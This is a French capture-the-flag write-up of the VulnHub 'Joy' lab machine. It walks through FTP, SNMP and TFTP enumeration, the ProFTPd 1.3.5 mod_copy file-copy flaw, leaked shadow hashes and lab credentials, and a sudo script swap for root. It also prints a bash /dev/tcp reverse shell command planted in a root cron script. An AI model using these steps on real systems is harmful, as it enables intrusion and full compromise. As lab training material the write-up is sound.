---
title: "Solution du CTF Joy de VulnHub"
tags: [VulnHub, CTF, snmp]
---

Je continue sur la lignée des CTFs créés par _Donavan_ avec le CTF [Joy](https://vulnhub.com/entry/digitalworldlocal-joy,298/) que vous pouvez récupérer sur VulnHub.

```
Nmap scan report for 192.168.56.121
Host is up (0.0012s latency).
Not shown: 65523 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE UIDL STLS RESP-CODES TOP PIPELINING CAPA
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 more IDLE OK post-login listed capabilities Pre-login have LOGINDISABLEDA0001 SASL-IR STARTTLS LOGIN-REFERRALS ENABLE ID LITERAL+
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
993/tcp open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:0A:09:A1 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2023-03-09T20:56:13+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-03-09T12:56:13
|_  start_date: N/A
|_clock-skew: mean: -1h40m01s, deviation: 4h37m07s, median: 59m57s
```

SMB se montre muet comme une carpe :

```console
$ smbclient -U "" -N -L //192.168.56.121

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.5.12-Debian)
SMB1 disabled -- no workgroup available
```

## Le petit tour

On note la présence d'un serveur _DropBear SSH_. Cette version 0.34 est sujette à une [Remote Code Execution](https://www.exploit-db.com/exploits/387) mais l'exploit semble assez hasardeux.
Il faut disposer du binaire pour obtenir une adresse de la GOT et avoir une chance de viser juste, mais surtout pour exploiter la vulnérabilité il faut patcher et compiler une version spécifique d'un client SSH.
À lire le code de l'exploit, il s'agit d'exploiter une format string. Ça pourrait être intéressant de fouiller dedans s'il n'y avait pas besoin de recompiler un client à chaque fois... 

Du côté de FTP c'est mieux, car il propose une connexion anonyme. Je remarque aussi qu'il est possible d'écrire dans les différents dossiers présents.

Il y a deux dossiers (en plus de la racine). Voici le contenu du dossier `upload` :

```
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||57775|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp          2716 Mar  9 15:18 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
```

Ces fichiers n'ont rien de bien intéressant si ce n'est celui nommé `directory` :

```
Patrick's Directory

total 112
drwxr-xr-x 18 patrick patrick 4096 Mar  9 23:00 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick   24 Mar  9 23:00 2y61RoknYSBpuKSK3W7nHbum2P5tVmuzLpIHTHYYV6eo7nBKNbbatHDAqra5RHVx.txt
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
-rw-r--r--  1 patrick patrick   24 Mar  9 22:55 bzBxnx8TtQVc3ndiBpl6QHnbeekXlcwNIZ7nnMwMvLDO2z8REYiXNuBewuCBnJXU.txt
drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
-rw-r--r--  1 patrick patrick    0 Mar  9 22:55 fHCf7rDjM1nBstNORbq2y2y0ndSj4ij5.txt
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
d---------  2 root    root    4096 Jan  9  2019 script
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos
-rw-r--r--  1 patrick patrick    0 Mar  9 23:00 wjbjknfUrPgcTxErqJWHBWP3Y4SHUgai.txt

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```

On apprend au moins qu'il y a un utilisateur nommé `patrick` et que le système est en 64 bits.

Une tentative de connexion sur le SSH montre que le serveur ne semble accepter que l'authentification par clé.

## Silly Network Management Protocol

Après avoir tourné pendant un moment sur les différents ports, étudié l'exploitabilité de telle ou telle vulnérabilité, tenter d'obtenir quelque chose des noms de fichiers en base64, etc, j'en suis finalement arrivé à lancer un scan UDP : 

```console
$ sudo nmap -sU -v 192.168.56.121
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org ) at 13:07 CET
Initiating ARP Ping Scan at 13:07
Scanning 192.168.56.121 [1 port]
Completed ARP Ping Scan at 13:07, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:07
Completed Parallel DNS resolution of 1 host. at 13:07, 0.00s elapsed
Initiating UDP Scan at 13:07
Scanning 192.168.56.121 [1000 ports]
Increasing send delay for 192.168.56.121 from 0 to 50 due to max_successful_tryno increase to 4
--- snip ---
UDP Scan Timing: About 96.26% done; ETC: 13:25 (0:00:40 remaining)
Discovered open port 123/udp on 192.168.56.121
Completed UDP Scan at 13:25, 1090.76s elapsed (1000 total ports)
Nmap scan report for 192.168.56.121
Host is up (0.00016s latency).
Not shown: 992 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
123/udp  open          ntp
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open          snmp
631/udp  open|filtered ipp
1900/udp open|filtered upnp
5353/udp open|filtered zeroconf
MAC Address: 08:00:27:0A:09:A1 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1090.94 seconds
           Raw packets sent: 1500 (71.864KB) | Rcvd: 1089 (82.833KB)
```

Il semblerait que SNMP soit en écoute. J'ai notamment déjà vu ce protocole sur le CTF [Mischief de HackTheBox]({% link _posts/2019-01-05-Solution-du-CTF-Mischief-de-HackTheBox.md %}).
Nmap dispose de différents scripts NSE pour SNMP. Par défaut, et même si on explicite quel script lancer, Nmap ne l'exécute pas si le service n'est pas sur un port par défaut.
Pour forcer l'exécution il faut placer le caractère `+` devant le nom du script. 

Ici 161 est le port par défaut donc inutile de préfixer le script, mais c'est sans doute une bonne habitude à prendre :

```console
$ sudo nmap -sU -p 161 --script +snmp-processes 192.168.56.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 18:36 CET
Nmap scan report for 192.168.56.121
Host is up (0.00011s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /sbin/init
|   2: 
|     Name: kthreadd
--- snip ---
|   699: 
|     Name: minissdpd
|     Path: /usr/sbin/minissdpd
|     Params: -i 0.0.0.0
|   718: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
--- snip ---
|   32556: 
|     Name: pickup
|     Path: pickup
|_    Params: -l -t unix -u -c
MAC Address: 08:00:27:0A:09:A1 (Oracle VirtualBox virtual NIC)
```

Je n'ai pas mis tout l'output qui est vraiment long.
Il y a donc un serveur TFTP sur un port non-standard. On n'aurait eu de chances de le voir que si on avait scanné la totalité des ports UDP, ce qui aurait pris l'éternité + un jour.

## Terribly Frivolous Transfer Protocol

Pour ceux qui ne connaissent pas TFTP, c'est un peu comme FTP, mais avec le mauvais goût d'utiliser UDP.
Plus sérieusement la différence majeure, c'est qu'on ne peut pas lister les fichiers présents, il faut donc savoir ce qu'on peut télécharger.
On peut aussi uploader des fichiers. C'est un protocole souvent utilisé en IOT pour mettre à jour un firmware ou démarrer un système distant (via _PXE_ : `Preboot Execution Environment`).

Je n'ai eu de chances avec aucun client TFTP pour communiquer efficacement avec le serveur. Il a donc fallu que je couple le client avec un Wireshark pour capturer les réponses.
`atftp` semble donner des réponses un peu plus exploitables.

Vu que je sais que la racine du _TFTP_ est `/home/patrick` je tente de lire la clé privée SSH :
```bash
atftp --get --remote-file .ssh/id_rsa --local-file id_rsa 192.168.56.121 36969
```

Depuis Wireshark je vois requête et réponse :

```
185	939.425495517	192.168.56.1	192.168.56.121	TFTP	62	Read Request, File: .ssh/id_rsa, Transfer type: octet	44165	36969
186	939.437735885	192.168.56.121	192.168.56.1	TFTP	64	Error Code, Code: Not defined, Message: Permission denied	33124	44165
```

J'ai plus de chances avec `version_control`. Pour obtenir le contenu je suis contraint d'extraire les données avec le `Copy` de Wireshark :

> Version Control of External-Facing Services:
> 
> Apache: 2.4.25  
> Dropbear SSH: 0.34  
> ProFTPd: 1.3.5  
> Samba: 4.5.12  
> 
> We should switch to OpenSSH and upgrade ProFTPd.
> 
> Note that we have some other configurations in this machine.
> 1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
> 2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

Cette version de ProFTPd est connue pour être vulnérable à une faille permettant la copie des fichiers sur le système : [ProFTPd 1.3.5 - File Copy](https://www.exploit-db.com/exploits/36742)

J'ai déjà croisé cette version sur le CTF [Symfonos #2]({% link _posts/2023-02-20-Solution-du-CTF-Symfonos-2-de-VulnHub.md %}).

Je vais copier le fichier `/etc/passwd` sur la racine web indiquée dans `version_control` :

```console
$ ncat 192.168.56.121 21 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.121:21.
220 The Good Tech Inc. FTP Server
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@JOY
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /var/www/tryingharderisjoy/passwd
250 Copy successful
quit
221 Goodbye.
^C
$ curl http://192.168.56.121/passwd
root:x:0:0:root:/root:/bin/bash
--- snip ---
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
ossec:x:117:123::/var/ossec/:/bin/false
ossecm:x:118:123::/var/ossec/:/bin/false
ossecr:x:119:123::/var/ossec/:/bin/false
mysql:x:120:125:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:121:126::/home/ntp:/bin/false
Debian-snmp:x:122:127::/var/lib/snmp:/bin/false
ftp:x:1001:1001::/home/ftp:/bin/false
tftp:x:123:128:tftp daemon,,,:/srv/tftp:/bin/false
postfix:x:124:129::/var/spool/postfix:/bin/false
dovecot:x:125:131:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:126:132:Dovecot login user,,,:/nonexistent:/bin/false
```

C'est prometteur. Je vais tenter de placer via un upload TFTP un shell PHP dans le fichier `haha` de `patrick` vu qu'on a vu plus tôt que le fichier est world-writable :

```bash
atftp --trace --put --remote-file haha --local-file shell.php 192.168.56.121 36969
```

Malheureusement le fichier semble rester vide... Sans doute qu'on ne peut pas écraser les fichiers :

```
2	0.001240035	192.168.56.121	192.168.56.1	TFTP	60	Acknowledgement, Block: 0	34556	40703
```

Finalement j'ai fait fuiter la config du serveur FTP (`/usr/local/etc/proftpd.conf`) :

```
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      JOY
ServerType                      standalone
ServerIdent                     on "The Good Tech Inc. FTP Server"
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            root
Group                           root

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite          on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User                          ftp
  Group                         ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients                    10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin                  welcome.msg
  DisplayChdir                  .message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    # DenyAll
  </Limit>
</Anonymous>
```

Sachant quelle est la racine FTP je peux ensuite uploader un webshell sur le FTP et utiliser `cpfr` / `cpto` pour recopier le fichier sous la racine web.
J'uploade aussi un `reverse-sshx64` via le FTP, car ni `curl` ni `wget` ne sont présents.

Avec tout ça j'obtiens mon reverse shell mais vu que le serveur FTP tourne en root on peut aussi fuiter le fichier `/etc/shadow` :

```
root:$6$1xFSccJ0$o0y1Y1wScZ7FSYrsqhwPSYlm58gMeXNI1w336fcuD1qhaJzpKpEFX2BF6KI2Ue.8LGg0ELoPzfMcAjCDyt7pO1:17888:0:99999:7:::
patrick:$6$gp70WRqc$Lx5OEcBPnCh.ADYE7BUvxd0vzQGgDwI6AYMmtkHdJ..5NcbwYgb04DJUx2rmyc6mjxW0We5nDCveoEWnoKAB.0:17888:0:99999:7:::
ftp:$6$tbnbaqvF$gXhtn5Yw9zruUoNwqweryiNV7G/ix1kwvYZ.BPANhndyBXTa5/oMx9UW6XZ6mQMaviuaIfU0/r.abgjBGL2z90:17902:0:99999:7:::
```

Aucun des hashs ne semble cassable. Ou encore le `/etc/sudoers` :

```
# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

patrick ALL=(ALL) NOPASSWD: /home/patrick/script/test
```

## PrivEsc

Sous la racine web, dans le dossier `ossec` on trouve des identifiants :

```console
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy 
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

On peut ainsi se connecter en tant que `patrick` via `su`. Le mot de passe root est invalide.

On a vu plus tôt que l'utilisateur peut exécuter `/home/patrick/script/test` via sudo mais on ne dispose d'aucun droit sur le dossier `script` qui appartient à root.

Sauf que, come vu sur le [CTF ColddWorld: Immersion]({% link _posts/2023-02-17-Solution-du-CTF-ColddWorld-Immersion-de-VulnHub.md %}), si on contrôle le dossier parent alors on a le droit de renommage et donc de déplacement dans le même dossier.
Je vais donc déplacer le dossier `script` et en faire un autre à ma convenance :

```console
patrick@JOY:~$ ls -ld script/
d--------- 2 root root 4096 Jan  9  2019 script/
patrick@JOY:~$ chmod 755 script
chmod: changing permissions of 'script': Operation not permitted
patrick@JOY:~$ mv script yolo
patrick@JOY:~$ mkdir script
patrick@JOY:~$ cp /bin/dash script/test
patrick@JOY:~$ sudo /home/patrick/script/test
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
author-secret.txt  document-generator.sh  dovecot.crt  dovecot.csr  dovecot.key  permissions.sh  proof.txt  rootCA.key  rootCA.pem  rootCA.srl
# cat proof.txt
Never grant sudo permissions on scripts that perform system functions!
```

C'est un peu la méthode bourrin. La solution attendue consiste à faire exécuter `/home/patrick/script/test` dont le fonctionnement est assez verbeux :
```bash
#!/bin/sh

echo "I am practising how to do simple bash scripting!"
sleep 3

echo "What file would you like to change permissions within this directory?"

read file
sleep 3

echo "What permissions would you like to set the file to?"

read permissions
sleep 3

echo "Currently changing file permissions, please wait."
sleep 3

chmod $permissions /home/patrick/script/$file
echo "Tidying up..."
sleep 3

echo "Done!"
```

Juste en exécutant on devine alors qu'on peut changer les permissions sur n'importe quel fichier. De quoi rendre `/etc/passwd` ou `/etc/sudoers` world-writable ou encore placer le bit setuid sur un exécutable.

Une autre solution consiste à ne pas quitter notre connexion FTP. Par exemple je peux utiliser les commandes `site` pour fuiter la `crontab` de root (`/var/spool/cron/crontabs/root`) :

```bash
*/3 * * * * bash /root/permissions.sh
*/5 * * * * bash /root/document-generator.sh
```

Je crée un fichier `mytask.sh` avec le contenu suivant :

```bash
bash -i >& /dev/tcp/192.168.56.1/7777 0>&1
```

Je l'uploade via FTP et j'écrase `/root/permissions.sh` :


```
site cpfr /home/ftp/mytask.sh
350 File or directory exists, ready for destination name
site cpto /root/permissions.sh
250 Copy successful
```

Après quelques minutes ça vient :

```console
$ ncat -l -p 7777 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 192.168.56.121.
Ncat: Connection from 192.168.56.121:37186.
bash: cannot set terminal process group (1732): Inappropriate ioctl for device
bash: no job control in this shell
root@JOY:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

De la même façon, on peut directement écraser `/etc/crontab` ou `/etc/passwd` (mais avec la restriction sur les clés ce n'est pas intéressant).

Toutes les solutions concernant les clés SSH sont plus contraignantes, car _DropBear_ a son propre format de clés.
Il faudrait utiliser un utilitaire spécifique pour convertir une clé du format _OpenSSH_ vers _DropBear_ ou se servir de _DropBear_ pour générer une clé valide.
